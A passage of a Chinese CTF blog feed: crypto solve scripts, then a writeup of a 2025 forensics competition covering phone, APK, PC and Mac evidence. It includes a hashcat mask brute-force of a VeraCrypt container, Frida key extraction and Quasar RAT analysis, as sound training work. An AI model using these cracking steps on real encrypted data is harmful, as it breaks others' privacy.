class="built_in">range</span>(<span class="built_in">len</span>(s)-<span class="number">1</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line">    flag+=<span class="built_in">chr</span>(s[i]^tmp)</span><br><span class="line">    tmp=s[i]^tmp</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p&#x27;</span>+flag[::-<span class="number">1</span>])</span><br></pre></td></tr></table></figure><h3 id="轮回密码">轮回密码</h3><p>题目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">samsara_encrypt</span>(<span class="params">text, key_word</span>):</span><br><span class="line">    cycle_step = <span class="built_in">len</span>(key_word) % <span class="number">6</span> + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    phase1 = <span class="built_in">bytes</span>([(c &gt;&gt; cycle_step) | ((c &lt;&lt; (<span class="number">8</span> - cycle_step)) &amp; <span class="number">0xFF</span>) <span class="keyword">for</span> c <span class="keyword">in</span> text])</span><br><span class="line"></span><br><span class="line">    phase2 = base64.b85encode(phase1)</span><br><span class="line"></span><br><span class="line">    phase3 = <span class="built_in">bytes</span>([(c &gt;&gt; cycle_step) | ((c &lt;&lt; (<span class="number">8</span> - cycle_step)) &amp; <span class="number">0xFF</span>) <span class="keyword">for</span> c <span class="keyword">in</span> phase2])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([phase3[i] ^ key_word[i % <span class="built_in">len</span>(key_word)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(phase3))])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    flag = <span class="string">b&quot;palu&#123;********&#125;&quot;</span> </span><br><span class="line">    key = <span class="string">b&quot;&quot;</span></span><br><span class="line">    cipher = samsara_encrypt(flag, key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;轮回密文:&quot;</span>, cipher.decode(<span class="string">&#x27;latin-1&#x27;</span>))</span><br></pre></td></tr></table></figure><p>轮换加密，照着逻辑换回去就行</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">cipher_text = <span class="string">&#x27;y¦_6&gt;X¬y!,!n¡mSaÜñüë9¼6&#x27;</span>.encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">key=<span class="string">b&#x27;Bore&#x27;</span></span><br><span class="line">cycle_step = <span class="built_in">len</span>(key) % <span class="number">6</span> + <span class="number">1</span></span><br><span class="line">phase3=<span class="built_in">bytes</span>([cipher_text[i] ^ key[i % <span class="built_in">len</span>(key)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher_text))])</span><br><span class="line">phase2=<span class="built_in">bytes</span>([ ((c &gt;&gt; (<span class="number">8</span> - cycle_step))|(c &lt;&lt; cycle_step)  &amp; <span class="number">0xFF</span>) <span class="keyword">for</span> c <span class="keyword">in</span> phase3])</span><br><span class="line">phase1=base64.b85decode(phase2)</span><br><span class="line">flag=<span class="built_in">bytes</span>([(c &gt;&gt; (<span class="number">8</span> - cycle_step) | ((c &lt;&lt; cycle_step)) &amp; <span class="number">0xFF</span>) <span class="keyword">for</span> c <span class="keyword">in</span> phase1])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#b&#x27;palu&#123;reincarnation_cipher&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="rsa_quartic_quandary">RSA_Quartic_Quandary</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sympy <span class="keyword">as</span> sp</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_p_q</span>(<span class="params">pq, p4_plus_q4</span>):</span><br><span class="line">    x, y = sp.symbols(<span class="string">&#x27;x y&#x27;</span>)</span><br><span class="line">    eq = (x**<span class="number">2</span> - <span class="number">2</span> * y)**<span class="number">2</span> - <span class="number">2</span> * y**<span class="number">2</span> - p4_plus_q4</span><br><span class="line">    solutions_for_x = sp.solve(eq.subs(y, pq), x)</span><br><span class="line">    results = []</span><br><span class="line">    <span class="keyword">for</span> x_sol <span class="keyword">in</span> solutions_for_x:</span><br><span class="line">        t = sp.symbols(<span class="string">&#x27;t&#x27;</span>)</span><br><span class="line">        quadratic_eq = t**<span class="number">2</span> - x_sol * t + pq</span><br><span class="line">        roots = sp.solve(quadratic_eq, t)</span><br><span class="line">        results.append(roots)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> results</span><br><span class="line">n = <span class="number">125997816345753096048865891139073286898143461169514858050232837657906289840897974068391106608902082960171083817785532702158298589600947834699494234633846206712414663927142998976208173208829799860130354978308649020815886262453865196867390105038666506017720712272359417586671917060323891124382072599746305448903</span></span><br><span class="line">s = <span class="number">35935569267272146368441512592153486419244649035623643902985220815940198358146024590300394059909370115858091217597774010493938674472746828352595432824315405933241792789402041405932624651226442192749572918686958461029988244396875361295785103356745756304497466567342796329331150560777052588294638069488836419744297241409127729615544668547101580333420563318486256358906310909703237944327684178950282413703357020770127158209107658407007489563388980582632159120621869165333921661377997970334407786581024278698231418756106787058054355713472306409772260619117725561889350862414726861327985706773512963177174611689685575805282</span></span><br><span class="line">solutions = solve_p_q(n, s)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">16076213508704830809521504161524867240789661063230251272973700316524961511842110066547743812160813341691286895800830395413052502516451815705610447484880112548934311914559776633140762863945819054432492392315491109745915225117227073045171062365772401296382778452901831550773993089344837645958797206220200272941</span></span><br><span class="line"><span class="keyword">for</span> i, sol <span class="keyword">in</span> <span class="built_in">enumerate</span>(solutions):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(sol[<span class="number">0</span>])&gt;<span class="number">0</span> <span class="keyword">and</span> <span class="built_in">int</span>(sol[<span class="number">1</span>])&gt;<span class="number">0</span>:</span><br><span class="line">        p = <span class="built_in">int</span>(sol[<span class="number">0</span>])</span><br><span class="line">        q = <span class="built_in">int</span>(sol[<span class="number">1</span>])</span><br><span class="line">        d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">        m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment">#b&#x27;palu&#123;This_is_a_fake_flag_change_it_for_real_use&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="section-60"></h3>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> Parloo杯 </tag>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>盘古石杯2025初赛 Writeup+复现（断更中）</title>
      <link href="/posts/56d4296b/"/>
      <url>/posts/56d4296b/</url>
      
        <content type="html"><![CDATA[<blockquote><p>这次混了个预赛二等奖，但同样未能成功晋级，菜炸了（（唉好好复现学习一下吧以下是在w8nn9z、1n1t两位爷的帮助下一起尝试完成的复现Orz</p></blockquote><blockquote><p>服务器取证部分复现起来有点耗时耗力，暂时先搁置了。。。也许等下一次打取证比赛前会想起更新吧（）</p><p>数据取证部分在网上没找到标准答案，就不复现了。</p></blockquote><h2 id="手机取证">手机取证</h2><h3 id="section">1</h3><p><strong>分析安卓手机检材，手机的IMSI是？</strong></p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747143336775-d036b3a8-4148-48e5-bd17-e83df98629fb.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>460036641292715</p><h3 id="section-1">2</h3><p><strong>养鱼诈骗投资1000，五天后收益是？</strong></p><p>在QQ聊天记录里可以找到</p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747143522201-4f663577-dfd6-4982-8908-353bd355dab9.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>175</p><h3 id="section-2">3</h3><p><strong>分析苹果手机检材，手机的IDFA是？</strong></p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747144195467-024cb18f-11de-49a4-8712-b9832db8c265.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>E477D4C7-BD02-4979-BC9D-5C5DE7BD1F17</p><h3 id="section-3">4</h3><p><strong>Telegram应用的卸载时间是？</strong></p><p>过滤卸载记录</p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747144435931-9ed3c23b-b7e9-4bd2-af9e-16b34a968192.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>2025-04-17-10:51:39</p><h3 id="section-4">5</h3><p><strong>机主hotmail邮箱地址是？</strong></p><p>telegram聊天记录中有提到</p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747144721011-e8536ab7-3e6d-4d1e-8646-5f6a181b7db9.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>hostsixer@hotmail.com</p><h3 id="section-5">6</h3><p><strong>苹果电脑开机密码是？</strong></p><p>在手机截屏里</p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747144951825-4a46e6b4-c115-431d-85a8-9950f4caa0e1.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>12345678</p><h3 id="section-6">7</h3><p><strong>Telegram加密通讯中，加密聊天信息用到的第二个解密载体是？</strong></p><p>在mac的备忘录中找到《蜜语规则》</p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747145375083-c7085502-b04a-41a3-a8e3-2fe3bea2f801.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>2.mp4</p><h3 id="section-7">8</h3><p><strong>贾韦码的内部代号是？</strong></p><p>在苹果手机的office文件中找到聊天话术V2.docx，其中有提到被害者代号</p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747145781497-9cc21e4e-5b54-4b96-8924-ee3baea15503.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>48</p><h3 id="section-8">9</h3><p><strong>特快专递的收货地址是？</strong></p><p>还是在上一题的文档中有提到</p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747145907155-94225710-42fb-4763-a5a6-9d456988f548.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>西红市中山路35号PGS健身房</p><h2 id="apk取证">APK取证</h2><h3 id="section-9">1</h3><p><strong>分析安卓检材，远控工具包名是？</strong></p><p>可以看到QQ聊天记录中传了一个apk文件</p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747147039168-67b4b0a2-6e04-4522-ad75-699afd0cce0a.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>用jadx看一下可以确定这个apk就是手机中已经安装的rustdesk</p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747147090731-a98bf2e8-b2c9-422a-a07f-1837981354ee.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>com.carriez.flutter_hbb</p><h3 id="section-10">2</h3><p><strong>远控工具中继服务器IP是？</strong></p><p>直接去配置文件里面翻就能找到</p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747150578925-6ae9fb3d-2ed4-473e-8db0-21111b3430a8.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>59.110.10.229</p><h3 id="section-11">3</h3><p><strong>远控工具ID服务器端口是？</strong></p><p>由上题可知</p><p>21116</p><h3 id="section-12">4</h3><p><strong>远控工具中继服务器Key是？</strong></p><p>由上题可知</p><p>WIUqzRq1Ocx4QNnsF26dZQijKdyd2L9OfaT55hDlQCI=</p><h3 id="section-13">5</h3><p><strong>远控工具中收藏的远程ID是？</strong></p><p>仍可以翻配置文件找到</p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747150872456-3b96eadc-874d-4c6c-9238-c661d2931421.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>1807892422</p><h3 id="section-14">6</h3><p><strong>远程控制该手机的手机型号是？</strong></p><p>翻配置文件</p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747150964079-94af8843-33be-4b18-b17f-fda30fa0ced9.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>google-Pixel</p><h3 id="section-15">7</h3><p><strong>监听工具包名是？</strong></p><p>在apk列表中可以找到</p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747151179608-e525a5cd-acdd-4151-9b65-ce2b467ac24a.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>com.example.liekai</p><h3 id="section-16">8</h3><p><strong>监听工具代码主入口是？</strong></p><p>用jadx看一下这个apk</p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747151350750-701578d3-3ec9-4e97-82d0-fe792cb9129c.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>com.example.liekai.MainActivity</p><h3 id="section-17">9</h3><p><strong>监听工具的签名算法是？</strong></p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747151475974-89ed64ad-acfd-4fa3-aa08-d2c108093dd3.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>SHA256RSA</p><h3 id="section-18">10</h3><p><strong>监听工具运行多少秒后会跳转成黑色幕布？</strong></p><p>可以把逆向出来的代码丢给ds</p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747226953032-31c8ca22-4610-4b62-bec3-9ff1ce10b17e.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>1.000</p><h3 id="section-19">11</h3><p><strong>监听工具运行后，黑色幕布上字符串是？</strong></p><p>用安卓开发者助手可以看到</p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747212549756-0c373caf-54f3-4ef7-9e35-84a9c83456fe.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>pgs比武专用</p><h3 id="section-20">12</h3><p><strong>监听工具检测到多少分贝开始录音？</strong></p><p>在程序的开头有这样一个页面</p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747210026517-8ebbe542-b7bd-4f10-96ab-f5c8b70583c6.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>70</p><h3 id="section-21">13</h3><p><strong>监听工具录音连续几秒没有检测到声音停止录音？</strong></p><p>由上题</p><p>4</p><h3 id="section-22">14</h3><p><strong>监听工具保存文件存储路径的数据库名称是？</strong></p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747215414525-6a42433e-35f5-425d-8e4b-709e106126fd.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>recordings.db</p><h3 id="section-23">15</h3><p><strong>监听工具保存录像文件的文件夹是？</strong></p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747215263195-4dc0e1c2-24f2-4d35-aa7b-a247b42e6705.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>recording</p><h3 id="section-24">16</h3><p><strong>监听工具数据库中保存音视频文件的路径使用什么加密？</strong></p><p>ds 逆向一下 encryption_utils.dart</p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747580187409-7b029cdc-97b4-4026-b420-e32595344b92.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>Salsa20</p><h3 id="section-25">17</h3><p><strong>录音的文件采用什么加密方式？</strong></p><p>由上题，密钥长度是32个字节，256bits</p><p>AES-256</p><h3 id="section-26">18</h3><p><strong>录像文件加密秘钥的最后一位是？</strong></p><p>ds 给出静态的key数据，但是明显有点问题</p><p>比如这个 454 显然不属于 uint8</p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747580591634-e44df25c-817d-4e24-847d-c73181dc0583.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>用 frida hook 能拿到真正的加密密钥，转一下hex</p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747580968961-7406fd13-16c8-4173-bb69-bd76cd411cb7.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>0x4D</p><h3 id="section-27">19*</h3><p><strong>原始文件md5为3b4d*<em>*</em>55ae的创建时间是？</strong></p><h2 id="计算机取证">计算机取证</h2><h3 id="section-28">1</h3><p><strong>分析贾韦码计算机检材，计算机系统Build版本为？</strong></p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747228908061-7e5a6780-c986-46bf-a72d-bfd4e92786df.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>18362</p><h3 id="section-29">2</h3><p><strong>计算机最后一次正常关机的时间为？UTC +0</strong></p><p>要求UTC+0 !!!</p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747229072376-ba829d46-5b63-450c-b7d5-f7feb4e0d3db.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>2025-04-18 03:20:54</p><h3 id="section-30">3</h3><p><strong>计算机网卡的MAC地址为？</strong></p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747229196965-00c266d1-1a26-4062-a2a2-ded687cd64cf.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>00-0C-29-0F-69-00</p><h3 id="section-31">4</h3><p><strong>计算机用户“贾韦码” 安全标识符SID为？</strong></p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747229272923-e717427e-ca5e-4a31-a1cd-112dd1a58968.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>S-1-5-21-3733482367-3411043098-2536183883-1001</p><h3 id="section-32">5</h3><p><strong>计算机默认浏览器为？</strong></p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747229355440-18269185-c84a-4d33-9290-9c7ad74f91e6.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>Google Chrome</p><h3 id="section-33">6</h3><p><strong>计算机默认浏览器版本为？</strong></p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747229716493-11b68db7-bd89-44f3-975f-cf35bdda4954.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>135.0.7049.96</p><h3 id="section-34">7</h3><p><strong>机主通过浏览器搜索国外社交软件为？</strong></p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747229812714-042207a6-82a8-4abd-9ec9-7e4f0bb6c16a.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>Telegram</p><h3 id="section-35">8</h3><p><strong>机主的邮箱账号为？</strong></p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747229908609-94f06860-e52a-4015-94d4-2e909e2d68d0.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>tqmdavidjohnson300@gmail.com</p><h3 id="section-36">9</h3><p><strong>计算机装过一款反取证软件为？</strong></p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747229987576-68e532c5-9bff-4fc3-9f45-60c0898a4cab.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>VeraCrypt.exe</p><h3 id="section-37">10</h3><p><strong>计算机通过Xshell远程连接的ip地址为？</strong></p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747230049925-0533c773-b719-4e83-bd6f-eeb2d9fc323a.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>192.168.56.129</p><h3 id="section-38">11</h3><p><strong>机主曾买过一个美国的TG账号，请给该账号的原两步验证密码？</strong></p><p>邮件中有提到</p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747230136956-13042a94-faef-4d91-9dbf-a24995a283dd.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>13770603</p><h3 id="section-39">12</h3><p><strong>给出其电脑内加密容器的解密密码？</strong></p><p>进入VR场景，在受害人家卧室的衣柜里发现有一个暗门</p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747230234897-b47f6363-b4cd-4326-a2be-bae0df549d2d.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>进入后桌上放着一张纸条，上面有密码</p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747230269207-ab33baba-61da-4812-867e-1a92f680b7d5.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>在pc的图片文件夹中找到加密容器</p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747230478139-35ba64d2-ed1a-4ea3-9799-1d233628c4d8.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>hashcat爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 13721 -a 3 dsf2wecasdcqwed12434 Pgs?d?d?d?dd3j</span><br></pre></td></tr></table></figure><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747234206476-5ac0509e-d4d9-4f0d-9f3f-a18db7be57bc.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>Pgs8521d3j</p><h3 id="section-40">13</h3><p><strong>给出其电脑内加密容器挂载的盘符？</strong></p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747238362680-6783aac7-3e96-4691-9d56-559a5b5f25e8.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>F</p><h3 id="section-41">14</h3><p><strong>给出其电脑内存放了多少张伪造身份证？</strong></p><p>挂载得到的容器，里面都是伪造身份证</p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747239021207-b7ce49cf-f824-404e-af3b-76ba0bfc1522.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>1023</p><h3 id="section-42">15</h3><p><strong>找出任敏的身份证编号？</strong></p><p>3.jpg就是要找的</p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747239116031-4a4afc74-d4ce-4d0a-bf5e-6aab3372c530.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>430529195112085460</p><h3 id="section-43">16</h3><p><strong>找出其电脑内存放的密钥文件，计算其MD5?</strong></p><p>可以看到曾查看过一个可疑文件</p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747411208296-4c1ca7cc-9e72-44f5-9172-5cc895b9bb7c.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>然而这个文件已经被删除了，但是我们仍可以在未使用空间中找到它</p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747411385879-4c6584fe-ee91-4637-9c50-149d2cbe0415.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>提取出来计算md5</p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747411600922-6ac05307-fdc3-45b3-88ec-4dca3261fc94.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>1022cc083a4a5a9e2036065e2822c48e</p><h3 id="section-44">17</h3><p><strong>找出其电脑内存放的密钥文件，解密此密钥文件，给出其内容？</strong></p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747411694516-5f21338f-c596-4cef-ba90-d8d6af0f1db2.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>zfs加密pool密钥文件</p><h3 id="section-45">18</h3><p><strong>对macOS系统进行解析，登陆的电子邮件服务是谁提供的？</strong></p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747326414891-9dbfa459-e14c-4bfe-8fe8-e088448d8114.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>microsoft</p><h3 id="section-46">19</h3><p><strong>系统备忘录的包名是什么？</strong></p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747326508781-354ebd41-5435-4dd9-89e7-93894951e64a.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>com.apple.Notes</p><h3 id="section-47">20</h3><p><strong>图片中隐藏的内容是什么？</strong></p><p>图片指的是之前看到的蜜语规则中的3.png</p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747326698002-26210cac-12a9-4b43-a780-0209033dd855.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>在red plane中可以看到一张二维码</p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747326772278-b48d2037-8cf4-425b-bae8-79c07bccd1d3.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747326838268-c3d65c0f-b721-418e-99ce-735005769898.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>位移加密 正向位移操作</p><h3 id="section-48">21</h3><p><strong>被加密文件的扩展名是什么？</strong></p><p>在桌面上找到被加密的文件，可以看到后缀名是enc</p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747327164325-3796ff4f-3f56-44ed-b687-d683db0eaf3e.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>enc</p><h3 id="section-49">22</h3><p><strong>被加密的文件总共有几个？</strong></p><p>由上题</p><p>1</p><h3 id="section-50">23</h3><p><strong>贾韦码家使用的智能门锁品牌型号是什么？</strong></p><p>由苹果应用取证部分可看到加密逻辑其实就是个AES</p><p>key直接运行原程序输出即可，IV是密文的前16字节</p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747414501156-b546cea6-36e7-4f3f-93b3-27f0040b18be.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>解压后是face1.jpg和资料.docx</p><p>阅读文档得知</p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747414632517-b3ccb973-dedb-412d-ad2a-51e1fd78a82b.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>金刚Ⅲ号</p><h2 id="exe取证">EXE取证</h2><h3 id="section-51">1</h3><p><strong>分析Windows木马，其控制端ip是？</strong></p><p>在pc的documents里可以找到一个exe文件</p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747327472273-6c77212d-7dc3-419b-850e-db39e665c09a.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>丢进云沙箱分析</p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747327600501-145ef66d-5bfc-42e1-95a5-e507def67c4c.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>104.18.45.79</p><h3 id="section-52">2</h3><p><strong>软件会复制自身到哪个文件夹下？</strong></p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747327712580-8cfacd22-b91e-4b80-a7e1-5ac3d0b28ea5.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>SubDir</p><h3 id="section-53">3</h3><p><strong>接上题，复制后软件名称是？</strong></p><p>由上题</p><p>BwAcr.exe</p><h3 id="section-54">4</h3><p><strong>软件一共可以窃取多少种浏览器的信息？</strong></p><p>用dnspy逆向上面的程序，可以看到这么几个函数的调用</p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747328637460-6d31edb4-7b30-49e1-b5a5-b2edebed54fe.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>经过依次点进去查看后，可以确定是有Brave, Google, Opera, OperaGX,Edge, Yandex, FireFox, IE</p><p>8</p><h3 id="section-55">5</h3><p><strong>软件查询安装的杀毒软件出错或异常会返回什么字符串？</strong></p><p>前面通过云沙箱可以得知这个程序是Quasar木马家族的，可以直接去github上面找到</p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747329228878-e6392864-365a-4710-9622-aa649d0671cb.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>Unknown</p><h2 id="苹果应用取证">苹果应用取证</h2><h3 id="section-56">1</h3><p><strong>对mac电脑中的加密程序进行分析，使用了一个特定的数作为密钥生成的种子，请问这个数是什么？</strong></p><p>在MAC的桌面上找到文件加密器</p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747408841216-e1b9ad4d-46e7-4b7e-baa1-028d809b74b6.png"alt="img" /><figcaption 